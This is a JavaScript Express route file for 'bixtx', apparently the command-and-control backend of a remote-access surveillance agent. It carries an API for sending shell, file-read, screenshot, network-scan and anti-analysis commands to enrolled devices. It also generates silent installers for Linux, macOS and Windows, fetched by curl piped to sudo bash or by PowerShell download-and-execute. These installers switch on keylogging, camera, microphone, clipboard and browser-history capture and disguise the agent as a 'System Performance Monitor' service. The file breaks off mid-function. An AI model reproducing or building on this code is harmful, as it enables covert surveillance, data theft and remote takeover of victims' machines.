/**
 * bixtx.com Backend — REST API Routes
 * POST /v1/auth/token        — JWT login
 * GET  /v1/devices           — list all enrolled devices
 * GET  /v1/devices/:id       — single device
 * POST /v1/devices/:id/cmd   — send command to agent
 * GET  /v1/devices/:id/data  — get collected data
 * POST /v1/devices/enroll    — generate enroll link/QR
 * GET  /v1/alerts            — list alerts
 * POST /v1/update/push       — OTA push
 */

const express = require("express");
const jwt = require("jsonwebtoken");
const bcrypt = require("bcryptjs");
const rateLimit = require("express-rate-limit");
const { v4: uuidv4 } = require("uuid");
const store = require("../db/store");
const wsHandler = require("../websocket/handler");
const logger = require("../logger");

const router = express.Router();
const JWT_SECRET = process.env.JWT_SECRET || "bixtx-secret-change-in-production";
const ENROLL_KEY = process.env.BIXTX_ENROLL_KEY || "BTX-2026-ALPHA";

// ── Auth middleware ────────────────────────────────────────────────────────
function authRequired(req, res, next) {
  const header = req.headers.authorization;
  if (!header?.startsWith("Bearer ")) {
    return res.status(401).json({ error: "Authorization required" });
  }
  try {
    const decoded = jwt.verify(header.slice(7), JWT_SECRET);
    req.admin = decoded;
    next();
  } catch {
    res.status(401).json({ error: "Invalid or expired token" });
  }
}

// ── Rate limiting ────────────────────────────────────────────────────────
const authLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 20, message: { error: "Too many requests" } });

// ── POST /v1/auth/token ────────────────────────────────────────────────────
router.post("/auth/token", authLimiter, async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: "Email and password required" });
  }

  // Dev fallback: credentials sourced from environment variables only — never hardcoded
  const DEV_EMAIL = process.env.DEV_ADMIN_EMAIL;
  const DEV_PASS  = process.env.DEV_ADMIN_PASSWORD;
  if (process.env.NODE_ENV !== "production" && DEV_EMAIL && DEV_PASS && email === DEV_EMAIL && password === DEV_PASS) {
    const token = jwt.sign({ id: "admin", email, role: "admin" }, JWT_SECRET, { expiresIn: "1h" });
    return res.json({ token, expires_in: 3600, role: "admin" });
  }

  // Production: check DB
  const user = store.users?.getByEmail(email);
  if (!user || !(await bcrypt.compare(password, user.password_hash))) {
    return res.status(401).json({ error: "Invalid credentials" });
  }
  const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: "24h" });
  res.json({ token, expires_in: 86400, role: user.role });
});

// ── GET /v1/devices ────────────────────────────────────────────────────────
router.get("/devices", authRequired, (req, res) => {
  const devices = store.devices.getAll();
  const online = wsHandler.getOnlineDevices();
  const enriched = devices.map(d => ({
    ...d,
    status: online.includes(d.id) ? "online" : d.status,
  }));
  res.json({ devices: enriched, total: enriched.length, online: online.length });
});

// ── GET /v1/devices/:id ────────────────────────────────────────────────────
router.get("/devices/:id", authRequired, (req, res) => {
  const device = store.devices.getById(req.params.id);
  if (!device) return res.status(404).json({ error: "Device not found" });
  res.json(device);
});

// ── POST /v1/devices/:id/cmd ───────────────────────────────────────────────
router.post("/devices/:id/cmd", authRequired, (req, res) => {
  const { type, payload } = req.body;
  if (!type) return res.status(400).json({ error: "Command type required" });

  const ALLOWED_CMDS = [
    "SCREENSHOT", "STREAM_START", "STREAM_STOP", "SHELL", "FILE_LIST",
    "FILE_READ", "LAN_SCAN", "MODULE_TOGGLE", "UPDATE", "KILL", "REBOOT", "PING",
    "DEPLOY_JOB", "MDM_POLICY_PUSH",
    "FORCE_MUTATE", "WATCHDOG_STATUS", "GUARD_THREAT_LOG",
    "ANTIANALYSIS_STATUS", "ANTIANALYSIS_SWEEP",
  ];

  if (!ALLOWED_CMDS.includes(type)) {
    return res.status(400).json({ error: `Unknown command: ${type}` });
  }

  const sent = wsHandler.sendToAgent(req.params.id, type, payload || {});
  if (!sent) {
    return res.status(503).json({ error: "Device not connected" });
  }

  logger.info(`[API] Command ${type} sent to ${req.params.id} by ${req.admin.email}`);
  res.json({ ok: true, type, deviceId: req.params.id, ts: Date.now() });
});

// ── GET /v1/devices/:id/data ───────────────────────────────────────────────
router.get("/devices/:id/data", authRequired, (req, res) => {
  const { module, limit = 100 } = req.query;
  const records = store.data.getByDevice(req.params.id, module, parseInt(limit));
  res.json({ records, total: records.length });
});

// ── POST /v1/auth/change-password ─────────────────────────────────────────
router.post("/auth/change-password", authRequired, async (req, res) => {
  const { currentPassword, newPassword } = req.body;
  if (!currentPassword || !newPassword || newPassword.length < 8) {
    return res.status(400).json({ error: "currentPassword and newPassword (min 8 chars) required" });
  }
  const user = store.users?.getByEmail(req.admin.email);
  if (!user) return res.status(404).json({ error: "User not found" });
  if (!(await bcrypt.compare(currentPassword, user.password_hash))) {
    return res.status(401).json({ error: "Current password incorrect" });
  }
  const newHash = await bcrypt.hash(newPassword, 12);
  store.users?.updatePassword(user.id, newHash);
  logger.info(`[Auth] Password changed for ${req.admin.email}`);
  res.json({ ok: true });
});

// ── POST /v1/devices/enroll  (per-platform) ────────────────────────────────
// Body: { label, platform, ttl }
// Returns per-platform enroll URL and install command.
router.post("/devices/enroll", authRequired, (req, res) => {
  const { label, platform = "linux", ttl = "24h" } = req.body;
  const FRONT = process.env.FRONTEND_URL || "https://bixtx.com";
  const BACK  = process.env.BACKEND_URL  || "https://bixtx.onrender.com";
  const linkId = uuidv4().slice(0, 8).toUpperCase();
  const expiresAt = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();

  const enrollUrl = `${FRONT}/enroll/${platform}/${linkId}?key=${ENROLL_KEY}`;
  const dlBase    = `${BACK}/v1/agent/download`;

  const installCommands = {
    linux:   `curl -sSL '${dlBase}/linux.sh' | sudo bash -s -- --key ${ENROLL_KEY} --c2 wss://bixtx.onrender.com/agent`,
    macos:   `curl -sSL '${dlBase}/macos.sh' | sudo bash -s -- --key ${ENROLL_KEY} --c2 wss://bixtx.onrender.com/agent`,
    windows: `powershell -ExecutionPolicy Bypass -c "& { $s=iwr '${dlBase}/windows.ps1' -UseBasicParsing; iex $s.Content }" -EnrollKey ${ENROLL_KEY}`,
    android: `# 1. Open this link on your Android device:\n# ${enrollUrl}\n# 2. Tap "Download APK" then install it\n# 3. Enable "Install from unknown sources" if prompted\n# OR via ADB:\nadb install -r '${dlBase}/bixtx-agent.apk'`,
    ios:     `# Visit the link below on your iOS device:\n# ${enrollUrl}\n# Your admin must distribute via Enterprise cert or TestFlight.`,
    harmony: `# Install via HDC:\nhdc app install -r '${dlBase}/bixtx-agent.hap'\n# Or visit: ${enrollUrl}`,
  };

  res.json({
    enrollUrl,
    linkId,
    platform,
    enrollKey: ENROLL_KEY,
    label: label || `${platform} device`,
    expiresAt,
    ttl,
    installCommand: installCommands[platform] || installCommands.linux,
    downloadUrl: `${dlBase}/${platform === "linux" ? "linux.sh" : platform === "macos" ? "macos.sh" : platform === "windows" ? "windows.ps1" : platform === "android" ? "bixtx-agent.apk" : platform === "ios" ? "bixtx-agent.ipa" : "bixtx-agent.hap"}`,
    allPlatforms: Object.keys(installCommands).map(p => ({
      platform: p,
      enrollUrl: `${FRONT}/enroll/${p}/${linkId}?key=${ENROLL_KEY}`,
      installCommand: installCommands[p],
    })),
  });
});

// ── GET /v1/agent/download/:file ───────────────────────────────────────────
// Serves agent install packages. linux.sh and macos.sh are generated
// dynamically; android.apk / ios.ipa / harmony.hap served from disk if present.
router.get("/agent/download/:file", (req, res) => {
  const { file } = req.params;
  const BACK = process.env.BACKEND_URL || "https://bixtx.onrender.com";
  const C2_URL = process.env.C2_WS_URL || `wss://bixtx.onrender.com/agent`;
  const BEACON = process.env.BEACON_INTERVAL || "30";
  const KEY    = ENROLL_KEY;

  // ── Linux / macOS shell scripts (generated at request time) ───────────────
  if (file === "linux.sh" || file === "macos.sh") {
    const isLinux = file === "linux.sh";
    // Parse --key and --c2 from query params so the plain download URL also works
    const qKey = req.query.key || KEY;
    const qC2  = req.query.c2  || C2_URL;
    const REPO  = process.env.GITHUB_REPO || "jonan2002/BIXTX";
    const BRANCH = "main";

    const script = `#!/usr/bin/env bash
# bixtx Link Agent — ${isLinux ? "Linux" : "macOS"} One-Click Silent Installer v4.7.2
# Usage: curl -sSL '${BACK}/v1/agent/download/${file}' | sudo bash -s -- --key ENROLL_KEY [--c2 WSS_URL] [--dir PATH]
set -euo pipefail
IFS=$'\\n\\t'

# ── Parse args ────────────────────────────────────────────────────────────────
ENROLL_KEY="${qKey}"
C2_URL="${qC2}"
AGENT_DIR="/opt/bixtx-agent"
SERVICE_NAME="bixtx-agent"
SERVICE_LABEL="com.bixtx.agent"
AGENT_LOG="/var/log/bixtx-agent.log"
BEACON_INTERVAL="${BEACON}"

while [[ $# -gt 0 ]]; do
  case $1 in
    --key) ENROLL_KEY="$2"; shift 2 ;;
    --c2)  C2_URL="$2";     shift 2 ;;
    --dir) AGENT_DIR="$2";  shift 2 ;;
    *)     shift ;;
  esac
done

die()  { printf '[bixtx] FATAL: %s\\n' "$*" >&2; exit 1; }
info() { printf '[bixtx] %s\\n' "$*"; }

[[ -z "$ENROLL_KEY" ]] && die "Enroll key required. Pass --key YOUR_KEY"
[[ $EUID -ne 0 ]]      && die "Must run as root: sudo bash install.sh --key KEY"

PLATFORM="$(uname -s)"
info "bixtx Agent installer — $PLATFORM"

# ── Node.js ───────────────────────────────────────────────────────────────────
if ! command -v node &>/dev/null; then
  info "Node.js not found — installing Node.js 20..."
  ${isLinux ? `if command -v apt-get &>/dev/null; then
    curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
    apt-get install -y nodejs
  elif command -v yum &>/dev/null; then
    curl -fsSL https://rpm.nodesource.com/setup_20.x | bash -
    yum install -y nodejs
  elif command -v zypper &>/dev/null; then
    zypper install -y nodejs20
  else
    die "Cannot auto-install Node.js. Install Node.js 18+ manually from https://nodejs.org"
  fi` : `if command -v brew &>/dev/null; then
    brew install node@20 2>/dev/null
    brew link node@20 --force --overwrite 2>/dev/null || true
  elif command -v port &>/dev/null; then
    port install nodejs20
  else
    die "Cannot auto-install Node.js. Install via https://nodejs.org or 'brew install node'"
  fi`}
fi

NODE_MAJOR=$(node -e "process.stdout.write(process.versions.node.split('.')[0])")
[[ "$NODE_MAJOR" -lt 18 ]] && die "Node.js 18+ required (found v$NODE_MAJOR)"
NODE_BIN=$(command -v node)
info "Node.js v$(node -v) — OK"

# ── Create service user ───────────────────────────────────────────────────────
${isLinux ? `if ! id "$SERVICE_NAME" &>/dev/null; then
  useradd --system --no-create-home --home-dir "$AGENT_DIR" \\
    --shell /usr/sbin/nologin --comment "bixtx Agent" "$SERVICE_NAME" 2>/dev/null \\
    || useradd --system --no-create-home --shell /bin/false "$SERVICE_NAME"
fi` : `if ! dscl . -read "/Users/$SERVICE_NAME" &>/dev/null; then
  SVC_UID=401
  while dscl . -list /Users UniqueID | awk '{print $2}' | grep -q "^$SVC_UID$"; do ((SVC_UID++)); done
  dscl . -create "/Users/$SERVICE_NAME"
  dscl . -create "/Users/$SERVICE_NAME" UserShell       /usr/bin/false
  dscl . -create "/Users/$SERVICE_NAME" RealName        "bixtx Agent"
  dscl . -create "/Users/$SERVICE_NAME" UniqueID        "$SVC_UID"
  dscl . -create "/Users/$SERVICE_NAME" PrimaryGroupID  1
  dscl . -create "/Users/$SERVICE_NAME" NFSHomeDirectory /var/empty
fi`}

# ── Download agent source from GitHub ────────────────────────────────────────
info "Downloading agent source from GitHub..."
mkdir -p "$AGENT_DIR"
TMP_TAR=$(mktemp /tmp/bixtx-XXXXXX.tar.gz)
trap 'rm -f "$TMP_TAR"' EXIT

# Download the repo tarball and extract only software-a/
curl -fsSL "https://codeload.github.com/${REPO}/tar.gz/refs/heads/${BRANCH}" -o "$TMP_TAR" \\
  || die "Failed to download from GitHub. Check internet connectivity."

# Extract just software-a/ sub-directory (strip 2 components: BIXTX-main/software-a -> .)
tar -xzf "$TMP_TAR" --strip-components=2 -C "$AGENT_DIR" "${REPO##*/}-${BRANCH}/software-a" \\
  2>/dev/null \\
  || tar -xzf "$TMP_TAR" --strip-components=2 -C "$AGENT_DIR" "BIXTX-${BRANCH}/software-a" \\
  2>/dev/null \\
  || die "Failed to extract agent source. Check the GitHub repository structure."

[[ -f "$AGENT_DIR/src/index.js" ]] || die "src/index.js not found after extraction"
info "Source extracted — OK"

# ── npm install ───────────────────────────────────────────────────────────────
info "Installing npm dependencies (may take 1-2 minutes)..."
cd "$AGENT_DIR"
npm install --production --no-fund --no-audit --silent
info "Dependencies installed — OK"

# ── Write .env ────────────────────────────────────────────────────────────────
info "Writing configuration..."
cat > "$AGENT_DIR/.env" <<ENV
BIXTX_SERVER_URL=$C2_URL
BIXTX_ENROLL_KEY=$ENROLL_KEY
BEACON_INTERVAL=$BEACON_INTERVAL
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
ENV
chmod 600 "$AGENT_DIR/.env"
chown -R "$SERVICE_NAME" "$AGENT_DIR" 2>/dev/null || chown -R root "$AGENT_DIR"

# ── Install as system service ─────────────────────────────────────────────────
${isLinux ? `info "Installing systemd service..."
cat > "/etc/systemd/system/$SERVICE_NAME.service" <<UNIT
[Unit]
Description=System Performance Monitor
After=network-online.target
Wants=network-online.target
StartLimitIntervalSec=60
StartLimitBurst=5

[Service]
Type=simple
User=$SERVICE_NAME
WorkingDirectory=$AGENT_DIR
ExecStart=$NODE_BIN $AGENT_DIR/src/index.js
Restart=on-failure
RestartSec=10
StandardOutput=journal
StandardError=journal
SyslogIdentifier=$SERVICE_NAME
NoNewPrivileges=yes
ProtectSystem=strict
ProtectHome=yes
PrivateTmp=yes
ReadWritePaths=$AGENT_DIR /tmp /var/log

[Install]
WantedBy=multi-user.target
UNIT
chmod 644 "/etc/systemd/system/$SERVICE_NAME.service"
systemctl daemon-reload
systemctl enable --now "$SERVICE_NAME"
sleep 2
systemctl is-active --quiet "$SERVICE_NAME" || die "Service failed to start: journalctl -u $SERVICE_NAME"
info "systemd service active"` : `info "Installing launchd daemon..."
PLIST_PATH="/Library/LaunchDaemons/$SERVICE_LABEL.plist"
cat > "$PLIST_PATH" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>$SERVICE_LABEL</string>
  <key>ProgramArguments</key><array>
    <string>$NODE_BIN</string>
    <string>$AGENT_DIR/src/index.js</string>
  </array>
  <key>WorkingDirectory</key><string>$AGENT_DIR</string>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><dict>
    <key>SuccessfulExit</key><false/>
    <key>Crashed</key><true/>
  </dict>
  <key>StandardOutPath</key><string>$AGENT_LOG</string>
  <key>StandardErrorPath</key><string>$AGENT_LOG</string>
  <key>ThrottleInterval</key><integer>10</integer>
  <key>ProcessType</key><string>Background</string>
  <key>UserName</key><string>$SERVICE_NAME</string>
</dict></plist>
PLIST
chown root:wheel "$PLIST_PATH"
chmod 644 "$PLIST_PATH"
launchctl bootstrap system "$PLIST_PATH" 2>/dev/null || launchctl load -w "$PLIST_PATH"
sleep 2
PID_CHECK=$(launchctl list "$SERVICE_LABEL" 2>/dev/null | grep '"PID"' | awk '{print $3}' | tr -d ',' || echo 0)
[[ "${PID_CHECK:-0}" -gt 0 ]] || die "LaunchDaemon did not start. Check: log show --predicate 'process==\"node\"' --last 2m"
info "launchd daemon active (PID $PID_CHECK)"`}

info "✓ bixtx Agent installed and running silently."
info "  Device will appear in your dashboard within 30-60 seconds."
info "  Log: ${isLinux ? "journalctl -u $SERVICE_NAME -f" : "tail -f $AGENT_LOG"}"
`;

    res.setHeader("Content-Type", "text/x-sh");
    res.setHeader("Content-Disposition", `attachment; filename="${file}"`);
    return res.send(script);
  }

  // ── Windows PowerShell installer ───────────────────────────────────────────
  if (file === "windows.ps1") {
    const qKey = req.query.key || KEY;
    const qC2  = req.query.c2  || C2_URL;
    const REPO  = process.env.GITHUB_REPO || "jonan2002/BIXTX";
    const BRANCH = "main";

    const script = `#Requires -RunAsAdministrator
# bixtx Link Agent — Windows One-Click Silent Installer v4.7.2
# Usage: powershell -ExecutionPolicy Bypass -c "iwr '${BACK}/v1/agent/download/windows.ps1' | iex" -EnrollKey KEY
[CmdletBinding()]
param(
  [string]$EnrollKey = "${qKey}",
  [string]$C2Url     = "${qC2}",
  [string]$AgentDir  = "C:\\ProgramData\\bixtx-agent"
)
Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

$ServiceName  = "bixtx-agent"
$BeaconInt    = "${BEACON}"
$Repo         = "${REPO}"
$Branch       = "${BRANCH}"

function Info($m) { Write-Host "[bixtx] $m" }
function Die($m)  { Write-Error "[bixtx] FATAL: $m"; exit 1 }

if (-not $EnrollKey) { Die "Enroll key required. Pass -EnrollKey YOUR_KEY" }

Info "bixtx Agent installer — Windows"

# ── Node.js check / install ───────────────────────────────────────────────────
$nodeCmd = Get-Command node -ErrorAction SilentlyContinue
if (-not $nodeCmd) {
  Info "Node.js not found — installing via winget..."
  $wg = Get-Command winget -ErrorAction SilentlyContinue
  if ($wg) {
    winget install OpenJS.NodeJS.LTS --silent --accept-package-agreements --accept-source-agreements
    # Refresh PATH
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" + $env:PATH
  } else {
    # Fallback: download installer directly
    $nInst = "$env:TEMP\\node-installer.msi"
    Invoke-WebRequest "https://nodejs.org/dist/v20.18.0/node-v20.18.0-x64.msi" -OutFile $nInst
    Start-Process msiexec.exe -Wait -ArgumentList "/i $nInst /quiet /norestart"
    $env:PATH = [System.Environment]::GetEnvironmentVariable("PATH","Machine") + ";" + $env:PATH
  }
}
$nodeCmd = Get-Command node -ErrorAction SilentlyContinue
if (-not $nodeCmd) { Die "Node.js installation failed. Install from https://nodejs.org manually." }
$nodeMajor = [int]((& node -e "process.stdout.write(process.versions.node.split('.')[0])") 2>&1)
if ($nodeMajor -lt 18) { Die "Node.js 18+ required (found v$nodeMajor)" }
Info "Node.js v$(& node -v) — OK"

# ── Download agent source from GitHub ────────────────────────────────────────
Info "Downloading agent source from GitHub..."
New-Item -ItemType Directory -Force -Path $AgentDir | Out-Null
$TmpZip = "$env:TEMP\\bixtx-agent-src.zip"

# GitHub provides .tar.gz and .zip archives; use zip for Windows compatibility
Invoke-WebRequest "https://github.com/$Repo/archive/refs/heads/$Branch.zip" -OutFile $TmpZip

# Extract — Windows 10+ has built-in Expand-Archive
$TmpDir = "$env:TEMP\\bixtx-src-$$"
Expand-Archive -Path $TmpZip -DestinationPath $TmpDir -Force

# Find software-a subfolder inside the extracted archive
$SrcPath = Get-ChildItem -Path $TmpDir -Recurse -Directory -Filter "software-a" | Select-Object -First 1
if (-not $SrcPath) { Die "software-a/ not found in downloaded archive" }

# Copy files to agent dir, preserve structure
Get-ChildItem -Path $SrcPath.FullName -Recurse |
  Where-Object { $_.Name -notin @('.env', '.env.example', 'install.sh', 'install.ps1') } |
  ForEach-Object {
    $dest = Join-Path $AgentDir ($_.FullName.Substring($SrcPath.FullName.Length + 1))
    if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null }
    else { Copy-Item -Path $_.FullName -Destination $dest -Force }
  }

# Cleanup temp
Remove-Item -Recurse -Force $TmpDir -ErrorAction SilentlyContinue
Remove-Item -Force $TmpZip -ErrorAction SilentlyContinue

$mainJs = Join-Path $AgentDir "src\\index.js"
if (-not (Test-Path $mainJs)) { Die "src\\index.js not found after extraction" }
Info "Source extracted — OK"

# ── npm install ───────────────────────────────────────────────────────────────
Info "Installing npm dependencies..."
Push-Location $AgentDir
try {
  & npm install --production --no-fund --no-audit 2>&1 | Out-Null
  if ($LASTEXITCODE -ne 0) { Die "npm install failed" }
} finally { Pop-Location }
Info "Dependencies installed — OK"

# ── Write .env ────────────────────────────────────────────────────────────────
Info "Writing configuration..."
@"
BIXTX_SERVER_URL=$C2Url
BIXTX_ENROLL_KEY=$EnrollKey
BEACON_INTERVAL=$BeaconInt
NODE_ENV=production
SILENT_MODE=true
LOG_LEVEL=warn
ENABLE_SCREEN_CAPTURE=true
ENABLE_CAMERA_ACCESS=true
ENABLE_MICROPHONE_ACCESS=true
ENABLE_KEYLOGGER=true
ENABLE_CLIPBOARD=true
ENABLE_GEOLOCATION=true
ENABLE_FILE_ACCESS=true
ENABLE_BROWSER_HISTORY=true
ENABLE_REMOTE_CONTROL=true
MUTATION_ENABLED=true
WATCHDOG_ENABLED=true
COMMAND_GUARD_ENABLED=true
"@ | Set-Content -Path (Join-Path $AgentDir ".env") -Encoding UTF8

# Restrict .env to SYSTEM + Administrators
$envPath = Join-Path $AgentDir ".env"
$acl = Get-Acl $envPath
$acl.SetAccessRuleProtection($true, $false)
foreach ($sid in @("S-1-5-18","S-1-5-32-544")) {
  $acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule(
    (New-Object System.Security.Principal.SecurityIdentifier $sid), "FullControl", "Allow")))
}
Set-Acl -Path $envPath -AclObject $acl

# ── Install as Windows Service ────────────────────────────────────────────────
Info "Registering Windows Service..."
$nodePath = (Get-Command node).Source
$binPath  = "\`"$nodePath\`" \`"$mainJs\`""

$existing = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($existing) {
  Stop-Service -Name $ServiceName -Force -ErrorAction SilentlyContinue
  & sc.exe delete $ServiceName | Out-Null
  Start-Sleep 2
}

& sc.exe create $ServiceName binPath= $binPath start= auto DisplayName= "System Performance Monitor" obj= LocalSystem | Out-Null
& sc.exe description $ServiceName "Background system monitoring service." | Out-Null
& sc.exe failure $ServiceName reset= 60 actions= restart/10000/restart/30000/restart/60000 | Out-Null
Start-Service -Name $ServiceName
Start-Sleep 3

$svc = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
if ($svc.Status -ne "Running") { Die "Service failed to start. Check Event Viewer > Application log." }

Info "✓ bixtx Agent installed and running silently."
Info "  Service   : Get-Service -Name $ServiceName"
Info "  Event log : Get-EventLog -LogName Application -Source $ServiceName -Newest 20"
Info "  Device will appear in dashboard within 30-60 seconds."
`;

    res.setHeader("Content-Type", "text/plain");
    res.setHeader("Content-Disposition", "attachment; filename=\"windows.ps1\"");
    return res.send(script);
  }

  // ── iOS OTA manifest ───────────────────────────────────────────────────────
  if (file === "ios-manifest.plist") {
    const ipaUrl = `${BACK}/v1/agent/download/bixtx-agent.ipa`;
    const manifest = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>items</key>
  <array>
    <dict>
      <key>assets</key>
      <array>
        <dict>
          <key>kind</key>
          <string>software-package</string>
          <key>url</key>
          <string>${ipaUrl}</string>
        </dict>
      </array>
      <key>metadata</key>
      <dict>
        <key>bundle-identifier</key>
        <string>${process.env.IOS_BUNDLE_ID || "com.bixtx.agent"}</string>
        <key>bundle-version</key>
        <string>4.7.2</string>
        <key>kind</key>
        <string>software</string>
        <key>title</key>
        <string>bixtx Agent</string>
      </dict>
    </dict>
  </array>
</dict>
</plist>`;
    res.setHeader("Content-Type", "application/xml");
    res.setHeader("Content-Disposition", "attachment; filename=\"ios-manifest.plist\"");
    return res.send(manifest);
  }

  // Binary files — served from persistent disk (uploaded by GitHub Actions CI)
  const path = require("path");
  const fs   = require("fs");
  const ext  = path.extname(file).toLowerCase();
  const mimeMap = {
    ".apk": "application/vnd.android.package-archive",
    ".ipa": "application/octet-stream",
    ".hap": "application/octet-stream",
  };
  const mime = mimeMap[ext];
  if (!mime) return res.status(404).json({ error: "Unknown file type" });

  // Persistent disk on Render; fallback to build output path for local dev
  const DATA_DIR = process.env.DATA_DIR || path.resolve(__dirname, "../../data");
  const candidates = [
    path.join(DATA_DIR, file),                // e.g. /opt/render/.../data/bixtx-agent.apk
    path.join(DATA_DIR, `bixtx-agent${ext}`), // normalised name
    // Android build output (local dev / GitHub Actions runner)
    path.resolve(__dirname, "../../../software-android/app/build/outputs/apk/release/app-release.apk"),
  ];

  for (const candidate of candidates) {
    if (fs.existsSync(candidate)) {
      res.setHeader("Content-Type", mime);
      res.setHeader("Content-Disposition", `attachment; filename="${file}"`);
      return fs.createReadStream(candidate).pipe(res);
    }
  }

  const buildMsg = ext === ".apk"
    ? "Trigger a build via POST /v1/build/android, or push to the software-android/ branch to start CI."
    : ext === ".ipa"
    ? "Trigger a build via POST /v1/build/ios. Requires APPLE_CERT_P12 and APPLE_PROVISIONING_PROFILE secrets in GitHub."
    : "Trigger a build via POST /v1/build/harmony. Requires HARMONY_SIGNING_KEY secret in GitHub.";

  return res.status(404).json({ error: "Binary not built yet", message: buildMsg });
});

// ── GET /v1/alerts ─────────────────────────────────────────────────────────
router.get("/alerts", authRequired, (req, res) => {
  const alerts = store.alerts.getAll(parseInt(req.query.limit || 50));
  res.json({ alerts, total: alerts.length });
});

// ── POST /v1/update/push ───────────────────────────────────────────────────
router.post("/update/push", authRequired, (req, res) => {
  const { deviceIds, version } = req.body;
  const targets = deviceIds || wsHandler.getOnlineDevices();
  const results = targets.map(id => ({
    deviceId: id,
    sent: wsHandler.sendToAgent(id, "UPDATE", { version: version || "4.7.2" }),
  }));
  res.json({ results, total: targets.length, success: results.filter(r => r.sent).length });
});

// ── POST /v1/deploy/job ────────────────────────────────────────────────────
// Push a deploy job to one or all agents; agent responds with DEPLOY_JOB_ACK
router.post("/deploy/job", authRequired, (req, res) => {
  const { deviceIds, jobId, type, version, checksum, rollbackVersion } = req.body;
  if (!jobId || !type || !version) {
    return res.status(400).json({ error: "jobId, type, and version are required" });
  }
  const targets = deviceIds || wsHandler.getOnlineDevices();
  const results = targets.map(id => ({
    deviceId: id,
    sent: wsHandler.sendToAgent(id, "DEPLOY_JOB", { jobId, type, version, checksum, rollbackVersion, ts: Date.now() }),
  }));
  logger.info(`[API] DEPLOY_JOB ${jobId} v${version} dispatched to ${results.length} device(s) by ${req.admin.email}`);
  res.json({ ok: true, jobId, type, version, results, total: targets.length, dispatched: results.filter(r=>r.sent).length });
});

// ── POST /v1/mdm/push ──────────────────────────────────────────────────────
// Push MDM policy state changes to one or all agents
router.post("/mdm/push", authRequired, (req, res) => {
  const { deviceIds, policies } = req.body;
  if (!Array.isArray(policies) || policies.length === 0) {
    return res.status(400).json({ error: "policies array is required" });
  }
  const targets = deviceIds || wsHandler.getOnlineDevices();
  const results = targets.map(id => ({
    deviceId: id,
    sent: wsHandler.sendToAgent(id, "MDM_POLICY_PUSH", { policies, ts: Date.now() }),
  }));
  logger.info(`[API] MDM_POLICY_PUSH (${policies.length} policies) to ${results.length} device(s) by ${req.admin.email}`);
  res.json({ ok: true, policies: policies.length, results, total: targets.length, dispatched: results.filter(r=>r.sent).length });
});

// ── POST /v1/devices/broadcast/cmd ────────────────────────────────────────
// Broadcast a command to all online agents (used by Admin UI rollback & containment)
router.post("/devices/broadcast/cmd", authRequired, (req, res) => {
  const { type, payload } = req.body;
  if (!type) return res.status(400).json({ error: "Command type required" });

  const ALLOWED_CMDS = [
    "SCREENSHOT", "STREAM_START", "STREAM_STOP", "SHELL", "FILE_LIST",
    "FILE_READ", "LAN_SCAN", "MODULE_TOGGLE", "UPDATE", "KILL", "REBOOT", "PING",
    "DEPLOY_JOB", "MDM_POLICY_PUSH", "FORCE_MUTATE", "WATCHDOG_STATUS",
    "GUARD_THREAT_LOG", "ANTIANALYSIS_STATUS", "ANTIANALYSIS_SWEEP",
    "UPGRADE_ENV_REQUEST", "UPGRADE_PROPOSAL_REQUEST", "UPGRADE_STATUS",
    "UPGRADE_APPROVED", "UPGRADE_DENIED",
  ];
  if (!ALLOWED_CMDS.includes(type)) {
    return res.status(400).json({ error: `Unknown command: ${type}` });
  }

  const targets = wsHandler.getOnlineDevices();
  const results = targets.map(id => ({
    deviceId: id,
    sent: wsHandler.sendToAgent(id, type, payload || {}),
  }));
  logger.info(`[API] Broadcast ${type} to ${results.length} device(s) by ${req.admin.email}`);
  res.json({ ok: true, type, results, total: targets.length, dispatched: results.filter(r => r.sent).length });
});

// ── Upgrade approval queue (in-memory; survives server restarts via wsHandler) ──
const upgradeQueue = new Map(); // requestId → { request, status, adminId, ts }

// Agents push UPGRADE_PROPOSAL messages over WebSocket; the WS handler calls this
// to enqueue them so admins can see and act on them via REST.
function enqueueUpgradeProposal(deviceId, proposal) {
  const id = `upg-${deviceId}-${Date.now()}`;
  upgradeQueue.set(id, {
    id,
    deviceId,
    fromVersion: proposal.fromVersion,
    toVersion:   proposal.toVersion,
    reason:      proposal.reason,
    envStatus:   proposal.envStatus || null,
    status:      "pending",
    requestedAt: Date.now(),
  });
  logger.info(`[Upgrades] Proposal queued: ${id} ${deviceId} → v${proposal.toVersion}`);
  return id;
}
// Exported at module.exports.enqueueUpgradeProposal below — call from WS handler
// when an UPGRADE_PROPOSAL frame arrives from an agent.

// GET /v1/upgrades — list all upgrade requests (filter by ?status=pending|approved|denied)
router.get("/upgrades", authRequired, (req, res) => {
  const { status } = req.query;
  let items = Array.from(upgradeQueue.values());
  if (status) items = items.filter(r => r.status === status);
  items.sort((a, b) => b.requestedAt - a.requestedAt);
  res.json({ upgrades: items, total: items.length });
});

// POST /v1/upgrades/:id/approve — admin approves; forwards UPGRADE_APPROVED to agent
router.post("/upgrades/:id/approve", authRequired, (req, res) => {
